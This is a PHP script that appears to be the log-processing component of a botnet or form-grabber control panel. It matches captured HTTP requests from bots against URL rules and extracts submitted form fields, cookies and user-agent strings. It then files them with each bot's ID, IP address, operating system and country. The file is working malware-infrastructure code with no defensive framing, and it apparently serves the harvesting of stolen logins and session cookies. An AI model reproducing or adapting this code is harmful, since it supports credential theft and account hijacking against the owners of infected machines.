<?php
	require_once('inc/require.php');
	
	$rules = mysql_query("SELECT * FROM parse_rules");
	
	$rule_array = array();
	
	while($rule_sql = mysql_fetch_array($rules))
	{
		$valid_rule = 0;
		$raw_vars = explode(";", $rule_sql['vars']);
		
		$var_array = array();
		
		foreach($raw_vars as $raw_var)
		{
			if($raw_var != "")
			{
				$split = explode("=", $raw_var);
					
				$key = str_replace(array("%", " "), "", $split[0]);		
				$data = str_replace(array("\"", " "), "", $split[1]);			
						
				if($key != "" && $data != "")
				{
					$valid_rule = 1;

					$var = array(
						"key" => $key,
						"data" => $data,
					);
					
					array_push($var_array, $var);
				}
			}
		}
		
		if($valid_rule = 1)
		{
			$rule = array(
				"rid" => $rule_sql['id'],
				"url" => $rule_sql['url'],
				"vars" => $var_array,
				"rule" => $rule_sql['rule'],
			);
			
			array_push($rule_array, $rule);
		}
	}
	
	$logs = mysql_query("SELECT * FROM logs");
	
	while($log = mysql_fetch_array($logs))
	{
		foreach($rule_array as $rule)
		{
			if(fnmatch($rule['url'], $log['log_url']))
			{
				$valid_rule = 1;
				
				foreach($rule['vars'] as $var)
				{
					if(strstr($log['log'], $var['data']) === false)
					{
						$valid_rule = 0;
						break;
					}
				}
				
				if($valid_rule == 1)
				{
					$rule_format = $rule['rule'];
					
					$data = explode("\r\n\r\n", $log['log']);
					
					$header = $data[0];
					$body = $data[1];
					
					$cookie = "";
					$useragent = "";
					
					$header_vars = explode("\r\n", $header);
					
					foreach($header_vars as $hvar)
					{
						if(stristr($hvar, "User-agent: ") !== false)
						{
							$useragent = str_ireplace("User-agent: ", "", $hvar);
							$useragent = str_ireplace("\r\n", "", $useragent);
						}
						
						elseif(stristr($hvar, "Cookie: ") !== false)
						{
							$cookie = str_ireplace("Cookie: ", "", $hvar);
							$cookie = str_ireplace("\r\n", "", $cookie);
						}
					}
					
					$params = explode("&", $body);
					
					foreach($params as $param)
					{
						$part = explode("=", $param);
						
						if($part[0] && $part[1])
						{
							foreach($rule['vars'] as $var)
							{
								if(!strcmp($part[0], $var['data']))
								{
									$rule_format = str_replace("%".$var['key']."%", $part[1], $rule_format);
								}
							}
						}
					}
					
					//$rule_format = str_replace("\n", "<br/>", $rule_format);
					$rule_format = str_replace("%URL%", $log['log_url'], $rule_format);
					$rule_format = str_replace("%BOTID%", $log['unique_id'], $rule_format);
					$rule_format = str_replace("%IP%", $log['ip'], $rule_format);
					$rule_format = str_replace("%OS%", $log['os'], $rule_format);
					$rule_format = str_replace("%CC%", $log['country'], $rule_format);
					$rule_format = str_replace("%COOKIE%", $cookie, $rule_format);
					$rule_format = str_replace("%USERAGENT%", $useragent, $rule_format);
					
					$query = "SELECT * FROM parsed_logs WHERE rule_id='".(int)$rule['rid']."' AND log='".mysql_real_escape_string($rule_format)."'";
					if(mysql_num_rows(mysql_query($query)) <= 0)
					{
						$query = "INSERT INTO parsed_logs SET log_id='".(int)$log['log_id']."', rule_id='".(int)$rule['rid']."', log='".mysql_real_escape_string($rule_format)."'";
						mysql_query($query);
					}
				}
			}
		}
	}

				
?>